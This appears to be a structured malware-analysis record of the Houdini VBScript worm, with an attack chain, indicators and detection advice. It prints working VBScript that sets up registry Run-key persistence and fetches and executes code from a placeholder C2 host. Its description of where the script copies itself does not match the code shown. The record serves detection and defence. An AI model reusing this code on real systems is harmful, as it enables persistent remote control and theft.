package_info.package_manager: VBScript (delivered via email or web, not a traditional package manager)
package_info.why_malicious: The Houdini VBScript worm is explicitly designed to self-replicate, establish persistent access, and enable remote command execution via a command-and-control (C2) server. Its core behaviors—unauthorized propagation, persistence, and remote code execution—facilitate data theft, further malware deployment, and unauthorized system control, making it inherently malicious.

execution_context.trigger: At runtime, when the user opens the malicious VBScript file (typically after opening a malicious email attachment or web download).
execution_context.file_location: Malicious .vbs file delivered via email or web download, executed on the victim's system.
required_permissions: registry (write access to HKCU Run key)

malicious_snippets.code_snippet:
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile WScript.ScriptFullName, fso.GetSpecialFolder(2) & "\houdini.vbs", true
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Houdini", fso.GetSpecialFolder(2) & "\houdini.vbs"
malicious_snippets.code_behavior: At runtime, the code copies itself to the Windows startup folder and creates a registry key under HKCU\Software\Microsoft\Windows\CurrentVersion\Run, enabling automatic execution on system boot and ensuring persistent presence on the infected system.

malice_analysis.why_suspicious: The script performs self-replication by copying itself to a startup location and modifies the registry to achieve persistence, both of which are hallmark techniques of malware aiming to maintain long-term access without user awareness.
malice_analysis.violated_expectations: Legitimate scripts should not silently copy themselves to system startup folders or alter registry keys for persistence without explicit user consent and clear documentation.
malice_analysis.similar_legitimate_use: Enterprise IT scripts may configure startup tasks or registry keys, but such actions are typically performed by trusted administrators, are well-documented, and do not involve self-replicating code.
key_indicators: Self-copying of script to %APPDATA% or startup folder
Creation or modification of HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key referencing a .vbs file
Persistence established without user notification or consent
Execution of code from user profile or startup locations

execution_context.trigger: At runtime, after persistence is established and the script is executed (either manually or on system boot).
execution_context.file_location: Same malicious .vbs file located in the startup folder or user profile directory.

malicious_snippets.code_snippet:
Set xHttp = CreateObject("Microsoft.XMLHTTP")
xHttp.Open "GET", "http://malicious-c2-server.com/command", False
xHttp.Send
If xHttp.Status = 200 Then
  Execute xHttp.responseText
End If
malicious_snippets.code_behavior: At runtime, the code initiates an outbound HTTP GET request to a remote C2 server, retrieves a command payload, and dynamically executes the received code on the infected system, enabling remote attacker control and potential data exfiltration or further malware deployment.

malice_analysis.why_suspicious: The script establishes unsolicited outbound network connections to an untrusted remote server and executes code received over the network, a behavior strongly associated with remote access trojans and worms.
malice_analysis.violated_expectations: Normal scripts should not fetch and execute code from external, unauthenticated sources without explicit user approval, secure channels, and proper validation.
malice_analysis.similar_legitimate_use: Some enterprise update or management scripts may download code, but only from trusted, authenticated sources and with strict validation; dynamic execution of arbitrary remote code is not standard practice.
key_indicators: Outbound HTTP requests to hardcoded or suspicious domains
Dynamic execution of code received from remote server
No user notification or validation of downloaded code
Network activity initiated by scripting hosts (wscript.exe/cscript.exe)

attack_chain.action: User opens the malicious VBScript file, triggering initial execution of the worm.
attack_chain.leads_to: The worm begins its infection process on the victim's system.

attack_chain.action: The worm copies itself to the Windows startup folder and creates a registry key for persistence.
attack_chain.leads_to: Ensures the worm is automatically executed on every system boot, maintaining persistent access.

attack_chain.action: The worm connects to a remote C2 server to fetch and execute attacker-supplied commands.
attack_chain.leads_to: Enables remote control of the infected system, data exfiltration, and deployment of additional malware.

behavioral_signatures: VBScript files that copy themselves to %APPDATA% or Windows startup folders
VBScript-initiated outbound HTTP requests to untrusted or hardcoded domains
Dynamic execution of code fetched from remote servers via scripting hosts
file_indicators: Suspicious .vbs files located in Windows startup folders
Unexpected registry keys under HKCU\Software\Microsoft\Windows\CurrentVersion\Run referencing .vbs scripts
network_indicators: Outbound HTTP requests to domains such as malicious-c2-server.com
Unusual network activity from wscript.exe or cscript.exe to external IP addresses
detection_knowledge.how_to_detect: Monitor for VBScript files that establish persistence by copying themselves to startup folders or modifying Run registry keys. Flag scripts that initiate outbound HTTP requests to untrusted or hardcoded domains, especially if they subsequently execute downloaded code. Correlate endpoint process creation events involving wscript.exe or cscript.exe with network activity to detect worm-like propagation and C2 communication. Alert on registry keys referencing .vbs files in user profile or startup locations.
